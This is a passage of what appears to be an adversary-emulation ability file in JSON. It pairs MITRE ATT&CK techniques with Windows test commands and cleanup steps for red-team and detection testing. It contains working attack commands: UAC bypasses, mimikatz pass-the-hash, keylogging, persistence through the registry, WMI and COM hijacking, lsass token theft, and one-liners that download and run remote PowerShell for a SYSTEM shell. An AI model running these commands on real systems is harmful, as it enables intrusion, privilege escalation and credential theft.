        "description": "Creates a new 'AtomicTest' value pointing to an AppCert DLL in the AppCertDlls registry key. \nOnce the computer restarted, the DLL will be loaded in multiple processes and write an \n'AtomicTest.txt' file in C:\\Users\\Public\\ to validate that the DLL executed succesfully.\n\nReference: https://skanthak.homepage.t-online.de/appcert.html\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1546.009",
            "name": "Event Triggered Execution: AppCert DLLs"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "reg delete \"HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls\" /v \"AtomicTest\" /f; Remove-Item C:\\Users\\Public\\AtomicTest.dll -Force; Remove-Item C:\\Users\\Public\\AtomicTest.txt -Force",
                    "command": "Copy-Item 7e8ee7_AtomicTest.dll C:\\Users\\Public\\AtomicTest.dll -Force; reg add \"HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls\" /v \"AtomicTest\" /t REG_EXPAND_SZ /d \"C:\\Users\\Public\\AtomicTest.dll\" /f; Restart-Computer",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": [
                        "7e8ee7_AtomicTest.dll"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "2bf646d7610d9beea487c4332703af94",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "bc8b09387f195039c50f55b211b2077f": {
        "description": "Running Chrome VPN Extensions via the Registry install 2 vpn extension, please see \"T1133\\src\\list of vpn extension.txt\" to view complete list\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1133",
            "name": "External Remote Services"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "$extList = \"fcfhplploccackoneaefokcmbjfbkenj\", \"fdcgdnkidjaadafnichfpabhfomcebme\"; foreach ($extension in $extList) {; Remove-Item -Path \"HKLM:\\Software\\Wow6432Node\\Google\\Chrome\\Extensions\\$extension\" -ErrorAction Ignore}",
                    "command": "$extList = \"fcfhplploccackoneaefokcmbjfbkenj\", \"fdcgdnkidjaadafnichfpabhfomcebme\"; foreach ($extension in $extList) {;   New-Item -Path HKLM:\\Software\\Wow6432Node\\Google\\Chrome\\Extensions\\$extension -Force;   New-ItemProperty -Path \"HKLM:\\Software\\Wow6432Node\\Google\\Chrome\\Extensions\\$extension\" -Name \"update_url\" -Value \"https://clients2.google.com/service/update2/crx\" -PropertyType \"String\" -Force}; Start chrome; Start-Sleep -Seconds 30; Stop-Process -Name \"chrome\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "bc8b09387f195039c50f55b211b2077f",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "81ffd171df9baca7df26c1831e985233": {
        "description": "Create a task on a remote system.\n\nUpon successful execution, cmd.exe will create a scheduled task to spawn cmd.exe at 20:10 on a remote endpoint.\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1053.005",
            "name": "Scheduled Task/Job: Scheduled Task"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "SCHTASKS /Delete /S localhost /U DOMAIN\\user /P At0micStrong /TN \"Atomic task\" /F >nul 2>&1",
                    "command": "SCHTASKS /Create /S localhost /RU DOMAIN\\user /RP At0micStrong /TN \"Atomic task\" /TR \"C:\\windows\\system32\\cmd.exe\" /SC daily /ST 20:10",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "81ffd171df9baca7df26c1831e985233",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "777043894e42d2aae3881e63f6c76d33": {
        "description": "This Atomic will create a registry key called socks5_powershell for persistance access\nhttps://medium.com/walmartglobaltech/systembc-powershell-version-68c9aad0f85c\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1547.001",
            "name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-ItemProperty -Path HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -Name \"socks5_powershell\" -Force -ErrorAction Ignore",
                    "command": "$RunKey = \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"; Set-ItemProperty -Path $RunKey -Name \"socks5_powershell\" -Value \"powershell.exe -windowstyle hidden -ExecutionPolicy Bypass -File\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "777043894e42d2aae3881e63f6c76d33",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "52f892665a18ab1279574bb2a7313fb1": {
        "description": "Note: must dump hashes first\n[Reference](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth)\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1550.002",
            "name": "Use Alternate Authentication Material: Pass the Hash"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "%tmp%\\mimikatz\\x64\\mimikatz.exe \"sekurlsa::pth /user:Administrator /domain:%userdnsdomain% /ntlm:cc36cf7a8514893efccd3324464tkg1a\"",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "52f892665a18ab1279574bb2a7313fb1",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "ab99fc1d9a235d596624363137004e55": {
        "description": "Utilize PowerShell and external resource to capture keystrokes\n[Payload](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056.001/src/Get-Keystrokes.ps1)\nProvided by [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-Keystrokes.ps1)\n\nUpon successful execution, Powershell will execute `Get-Keystrokes.ps1` and output to key.log.\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1056.001",
            "name": "Input Capture: Keylogging"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item $env:TEMP\\key.log -ErrorAction Ignore",
                    "command": "Set-Location $PathToAtomicsFolder; .\\T1056.001\\src\\Get-Keystrokes.ps1 -LogPath $env:TEMP\\key.log",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "ab99fc1d9a235d596624363137004e55",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "fe9eeee9a7b339089e5fa634b08522c1": {
        "description": "Install a driver via pnputil.exe lolbin\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1547",
            "name": "Boot or Logon Autostart Execution"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "pnputil.exe /add-driver \"C:\\Windows\\INF\\usbstor.inf\"",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "fe9eeee9a7b339089e5fa634b08522c1",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "d1bde9af5206152c9980a5b6adcc1813": {
        "description": "Uses PowerShell and Empire's [GetSystem module](https://github.com/BC-SECURITY/Empire/blob/v3.4.0/data/module_source/privesc/Get-System.ps1). The script creates a named pipe, and a service that writes to that named pipe. When the service connects to the named pipe, the script impersonates its security context.\nWhen executed successfully, the test displays the domain and name of the account it's impersonating (local SYSTEM).\n\nReference: https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1134.001",
            "name": "Access Token Manipulation: Token Impersonation/Theft"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique NamedPipe -Verbose",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "d1bde9af5206152c9980a5b6adcc1813",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "98d52800f80810f334933d2ce3e2c430": {
        "description": "PowerShell code to bypass User Account Control using the Windows 10 Features on Demand Helper (fodhelper.exe). Requires Windows 10.\nUpon execution command prompt will be opened.\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1548.002",
            "name": "Abuse Elevation Control Mechanism: Bypass User Access Control"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item \"HKCU:\\software\\classes\\ms-settings\" -force -Recurse -ErrorAction Ignore",
                    "command": "New-Item \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Force; New-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"DelegateExecute\" -Value \"\" -Force; Set-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"(default)\" -Value \"C:\\Windows\\System32\\cmd.exe\" -Force; Start-Process \"C:\\Windows\\System32\\fodhelper.exe\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "98d52800f80810f334933d2ce3e2c430",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "fdee653dfaa508e308edc77910c21155": {
        "description": "This test simulates using desktopimgdownldr.exe to download a malicious file\ninstead of a desktop or lockscreen background img. The process that actually makes \nthe TCP connection and creates the file on the disk is a svchost process (“-k netsvc -p -s BITS”) \nand not desktopimgdownldr.exe. See https://labs.sentinelone.com/living-off-windows-land-a-new-native-file-downldr/\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1197",
            "name": "BITS Jobs"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "del C:\\Windows\\Temp\\Personalization\\LockScreenImage\\*.md >nul 2>&1",
                    "command": "set \"SYSTEMROOT=C:\\Windows\\Temp\" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md /eventName:desktopimgdownldr",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "fdee653dfaa508e308edc77910c21155",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "c1392878b0e39a2060e7e1b70e5a580b": {
        "description": "Get SYSTEM shell - Bind System Shell using UsoClient DLL load technique via function of WinPwn",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1055.001",
            "name": "Process Injection: Dynamic-link Library Injection"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/UsoDLL/Get-UsoClientDLLSystem.ps1')",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "c1392878b0e39a2060e7e1b70e5a580b",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "e9e69b4fedb8e40d634865ce9a3192dc": {
        "description": "Windows Management Instrumentation(WMI) objects contains system information which helps to detect virtualization. This command will specifically attempt to get the CurrentTemperature value from this object and will check to see if the attempt results in an error that contains the word supported. This is meant to find the result of Not supported, which is the result if run in a virtual machine\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1497.001",
            "name": "Virtualization/Sandbox Evasion: System Checks"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "$error.clear()",
                    "command": "$error.clear(); Get-WmiObject -Query \"SELECT * FROM MSAcpi_ThermalZoneTemperature\" -ErrorAction SilentlyContinue; if($error) {echo \"Virtualization Environment detected\"}",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "e9e69b4fedb8e40d634865ce9a3192dc",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "9420f2cd292320f9400feb907113f642": {
        "description": "After execution the new account will be active and added to the Administrators group",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1078.003",
            "name": "Valid Accounts: Local Accounts"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "net localgroup administrators art-test /delete >nul 2>&1 && net user art-test /delete >nul 2>&1",
                    "command": "net user art-test /add && net user art-test #{password} && net localgroup administrators art-test /add",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "9420f2cd292320f9400feb907113f642",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "3a67bc42e7f567d9faffab9af37afa72": {
        "description": "Disable User Account Conrol (UAC) using the builtin tool reg.exe by changing its registry key\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLUA from 1 to 0\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1548.002",
            "name": "Abuse Elevation Control Mechanism: Bypass User Access Control"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 1 /f",
                    "command": "reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "3a67bc42e7f567d9faffab9af37afa72",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "e648f7d27bb1fd8993e12e5e265da137": {
        "description": "Perform a packet capture using the windows command prompt. This will require a host that has Wireshark/Tshark\ninstalled.\n\nUpon successful execution, tshark will execute and capture 5 packets on interface \"Ethernet\".\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1040",
            "name": "Network Sniffing"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "\"c:\\Program Files\\Wireshark\\tshark.exe\" -i Ethernet -c 5",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "e648f7d27bb1fd8993e12e5e265da137",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "697e8a432031075e47cccba24417013d": {
        "description": "vbs files can be placed in and ran from the startup folder to maintain persistance. Upon execution, \"T1547.001 Hello, World VBS!\" will be displayed twice. \nAdditionally, the new files can be viewed in the \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\nfolder and will also run when the computer is restarted and the user logs in.\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1547.001",
            "name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\vbsstartup.vbs\" -ErrorAction Ignore; Remove-Item \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\vbsstartup.vbs\" -ErrorAction Ignore",
                    "command": "Copy-Item b6dec5_vbsstartup.vbs \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\vbsstartup.vbs\"; Copy-Item b6dec5_vbsstartup.vbs \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\vbsstartup.vbs\"; cscript.exe \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\vbsstartup.vbs\"; cscript.exe \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\vbsstartup.vbs\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": [
                        "b6dec5_vbsstartup.vbs"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "697e8a432031075e47cccba24417013d",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "aa147165f6c116cb0b0f944abe1db8ce": {
        "description": "PowerShell code to set Winlogon shell key to execute a binary at logon along with explorer.exe.\n\nUpon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1547.004",
            "name": "Boot or Logon Autostart Execution: Winlogon Helper DLL"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" -Name \"Shell\" -Force -ErrorAction Ignore",
                    "command": "Set-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\" \"Shell\" \"explorer.exe, C:\\Windows\\System32\\cmd.exe\" -Force",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "aa147165f6c116cb0b0f944abe1db8ce",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "53ec07fdf1496da055cd8026114957f1": {
        "description": "AppInit_DLLs is a mechanism that allows an arbitrary list of DLLs to be loaded into each user mode process on the system. Upon succesfully execution, \nyou will see the message \"The operation completed successfully.\" Each time the DLL is loaded, you will see a message box with a message of \"Install AppInit Shim DLL was called!\" appear.\nThis will happen regularly as your computer starts up various applications and may in fact drive you crazy. A reliable way to make the message box appear and verify the \nAppInit Dlls are loading is to start the notepad application. Be sure to run the cleanup commands afterwards so you don't keep getting message boxes showing up.\n\nNote: If secure boot is enabled, this technique will not work. https://docs.microsoft.com/en-us/windows/win32/dlls/secure-boot-and-appinit-dlls\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1546.010",
            "name": "Event Triggered Execution: AppInit DLLs"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "reg.exe import 9e2f65_T1546.010-cleanup.reg >nul 2>&1",
                    "command": "reg.exe import e764f6_T1546.010.reg",
                    "payloads": [
                        "e764f6_T1546.010.reg",
                        "9e2f65_T1546.010-cleanup.reg"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "53ec07fdf1496da055cd8026114957f1",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "4df4fdb269f34dd6d55969c83ff06c73": {
        "description": "Run from an administrator powershell window. After running, reboot the victim machine.\nAfter it has been online for 4 minutes you should see notepad.exe running as SYSTEM.\n\nCode references\n\nhttps://gist.github.com/mgreen27/ef726db0baac5623dc7f76bfa0fc494c\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1546.003",
            "name": "Event Triggered Execution: Windows Management Instrumentation Event Subscription"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "$EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class ActiveScriptEventConsumer -Filter \"Name = 'AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example'\"; $EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter \"Name = 'AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example'\"; $FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query \"REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding\" -ErrorAction SilentlyContinue; $FilterConsumerBindingToCleanup | Remove-WmiObject; $EventConsumerToCleanup | Remove-WmiObject; $EventFilterToCleanup | Remove-WmiObject",
                    "command": "$FilterArgs = @{name='AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example';                 EventNameSpace='root\\CimV2';                 QueryLanguage=\"WQL\";                 Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325\"}; $Filter=Set-WmiInstance -Class __EventFilter -Namespace \"root\\subscription\" -Arguments $FilterArgs; $ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example';                 ScriptingEngine='VBScript';                 ScriptText=';                 Set objws = CreateObject(\"Wscript.Shell\");                 objws.Run \"notepad.exe\", 0, True;                 '}; $Consumer=Set-WmiInstance -Namespace \"root\\subscription\" -Class ActiveScriptEventConsumer -Arguments $ConsumerArgs; $FilterToConsumerArgs = @{; Filter = $Filter; Consumer = $Consumer; }; $FilterToConsumerBinding = Set-WmiInstance -Namespace 'root/subscription' -Class '__FilterToConsumerBinding' -Arguments $FilterToConsumerArgs",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "4df4fdb269f34dd6d55969c83ff06c73",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "6fae357c43fd211c9d39fe7583281bf0": {
        "description": "This Action demonstrates how an access token for a specific program can spawn another program under a different owner. \nAdversaries can leverage access tokens to run programs under a different user not only to achieve privilege escalation but also to evade detection by blending in with normal user activity. \nThis Action will query all processes and list the process name and owner.It will then make a copy of an existing token to create a new instance of cmd.exe\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1134.002",
            "name": "Create Process with Token"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Set-ExecutionPolicy -Scope Process Bypass -Force; $owners = @{}; gwmi win32_process |% {$owners[$_.handle] = $_.getowner().user}; Get-Process | Select ProcessName,Id,@{l=\"Owner\";e={$owners[$_.id.tostring()]}}; $PathToAtomicsFolder\\T1134.002\\src\\GetToken.ps1; [MyProcess]::CreateProcessFromParent((Get-Process lsass).Id,\"cmd.exe\")",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "6fae357c43fd211c9d39fe7583281bf0",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "469f554b1c5e8613d3ec3662e9d9e3e1": {
        "description": "A Base64 Encoded command will be stored in the registry (ping 127.0.0.1) and then a scheduled task will be created.\nThe scheduled task will launch powershell to decode and run the command in the registry daily.\nThis is a persistence mechanism recently seen in use by Qakbot.  \n\n[Additiona Information](https://thedfirreport.com/2022/02/07/qbot-likes-to-move-it-move-it/)\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1053.005",
            "name": "Scheduled Task/Job: Scheduled Task"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "schtasks /delete /tn \"ATOMIC-T1053.005\" /F >nul 2>&1 && reg delete HKCU\\SOFTWARE\\ATOMIC-T1053.005 /F >nul 2>&1",
                    "command": "reg add HKCU\\SOFTWARE\\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f && schtasks.exe /Create /F /TN \"ATOMIC-T1053.005\" /TR \"cmd /c start /min \\\"\\\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\\\SOFTWARE\\\\ATOMIC-T1053.005).test)))\" /sc daily /st 07:45",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "469f554b1c5e8613d3ec3662e9d9e3e1",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "bdb6d94c9a1e25b29b33fa9a60d8bfad": {
        "description": "Create an scheduled task that executes notepad.exe after user login from XML by leveraging WMI class PS_ScheduledTask. Does the same thing as Register-ScheduledTask cmdlet behind the scenes.\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1053.005",
            "name": "Scheduled Task/Job: Scheduled Task"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Unregister-ScheduledTask -TaskName \"T1053_005_WMI\" -confirm:$false >$null 2>&1",
                    "command": "$xml = [System.IO.File]::ReadAllText(\"PathToAtomicsFolder\\T1053.005\\src\\T1053_005_WMI.xml\"); Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace \"Root\\Microsoft\\Windows\\TaskScheduler\" -MethodName \"RegisterByXml\" -Arguments @{ Force = $true; Xml =$xml; }",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "bdb6d94c9a1e25b29b33fa9a60d8bfad",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "d94bcdfc9d0f769b062e1960f7af6804": {
        "description": "Use the PowerShell to execute COM CLSID object.\nReference: https://pentestlab.blog/2020/05/20/persistence-com-hijacking/",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1546.015",
            "name": "Event Triggered Execution: Component Object Model Hijacking"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Get-Process -Name \"*calc\" | Stop-Process",
                    "command": "$o= [activator]::CreateInstance([type]::GetTypeFromCLSID(\"9BA05972-F6A8-11CF-A442-00A0C90A8F39\")); $item = $o.Item(); $item.Document.Application.ShellExecute(\"cmd.exe\",\"/c calc.exe\",\"C:\\windows\\system32\",$null,0)",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "d94bcdfc9d0f769b062e1960f7af6804",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "0c36042890d42dae60f45aca56aec809": {
        "description": "This test uses PowerShell to hijack a reference to a Component Object Model by creating registry values under InprocServer32 key in the HKCU hive then calling the Class ID to be executed via \"rundll32.exe -localserver [clsid]\". \nThis method is generally used as an alternative to 'rundll32.exe -sta [clsid]' to execute dll's while evading detection. \nReference: https://www.hexacorn.com/blog/2020/02/13/run-lola-bin-run/\nUpon successful execution of this test with the default options, whenever certain apps are opened (for example, Notepad), a calculator window will also be opened. ",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1546.015",
            "name": "Event Triggered Execution: Component Object Model Hijacking"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}' -Recurse -ErrorAction Ignore",
                    "command": "New-Item -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\#{clsid}' -Value '#{clsid_description}'; New-Item -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\#{clsid}\\InprocServer32' -Value; New-ItemProperty -Path 'HKCU:\\SOFTWARE\\Classes\\CLSID\\#{clsid}\\InprocServer32' -Name 'ThreadingModel' -Value '#{clsid_threading}' -PropertyType \"String\"; Start-Process -FilePath \"C:\\Windows\\System32\\RUNDLL32.EXE\" -ArgumentList '-localserver #{clsid}'",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "0c36042890d42dae60f45aca56aec809",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "7c8a19a8922ee0d61a9f27ffa8347de2": {
        "description": "Bypasses User Account Control using a fileless method, registry only.\nUpon successful execution, sdclt.exe will spawn cmd.exe to spawn notepad.exe\n[Reference - sevagas.com](http://blog.sevagas.com/?Yet-another-sdclt-UAC-bypass)\nAdapted from [MITRE ATT&CK Evals](https://github.com/mitre-attack/attack-arsenal/blob/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/stepFourteen_bypassUAC.ps1)\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1548.002",
            "name": "Abuse Elevation Control Mechanism: Bypass User Access Control"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item -Path \"HKCU:\\Software\\Classes\\Folder\" -Recurse -Force -ErrorAction Ignore",
                    "command": "New-Item -Force -Path \"HKCU:\\Software\\Classes\\Folder\\shell\\open\\command\" -Value 'cmd.exe /c notepad.exe'; New-ItemProperty -Force -Path \"HKCU:\\Software\\Classes\\Folder\\shell\\open\\command\" -Name \"DelegateExecute\"; Start-Process -FilePath $env:windir\\system32\\sdclt.exe; Start-Sleep -s 3",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "7c8a19a8922ee0d61a9f27ffa8347de2",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "3b6455f426a062f82fa5a1d128f46948": {
        "description": "This module utilizes the Windows API to schedule a task for code execution (notepad.exe). The task scheduler will execute \"notepad.exe\" within\n30 - 40 seconds after this module has run\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1053.005",
            "name": "Scheduled Task/Job: Scheduled Task"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
